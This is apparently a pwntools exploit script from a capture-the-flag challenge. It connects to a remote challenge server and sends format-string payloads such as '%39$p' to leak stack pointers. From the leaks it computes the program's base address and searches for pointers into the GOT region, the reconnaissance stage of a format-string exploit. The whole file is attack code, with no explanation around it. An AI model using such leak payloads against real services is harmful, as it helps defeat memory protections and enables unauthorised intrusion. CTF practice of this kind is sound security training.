from pwn import *

# Set context
context.arch = 'amd64'

def find_got_ptr():
    r = remote('chals.cyberjousting.com', 1367)
    payload = b'wrong|%39$p'
    r.sendlineafter(b'?', payload)
    r.recvuntil(b'|')
    main_addr = int(r.recvuntil(b'.', drop=True), 16)
    base_addr = main_addr - 0x5c9
    r.close()
    
    print(f"Base address: {hex(base_addr)}")
    
    for start in range(1, 100, 10):
        r = remote('chals.cyberjousting.com', 1367)
        payload = b'byuctf{welcome_to_rev_fellas}'
        for i in range(start, start + 10):
            payload += f"|%{i}$p".encode()
        r.sendlineafter(b'?', payload)
        r.recvuntil(b'Correct! The flag is ')
        data = r.recvline().decode().strip()
        leaks = data.split('|')[1:]
        r.close()
        for i, l in enumerate(leaks):
            try:
                v = int(l, 16)
                if base_addr + 0x2e00 <= v < base_addr + 0x3200:
                    print(f"Index {start + i} points to GOT/Data: {hex(v)} (offset {hex(v - base_addr)})")
            except: pass

find_got_ptr()
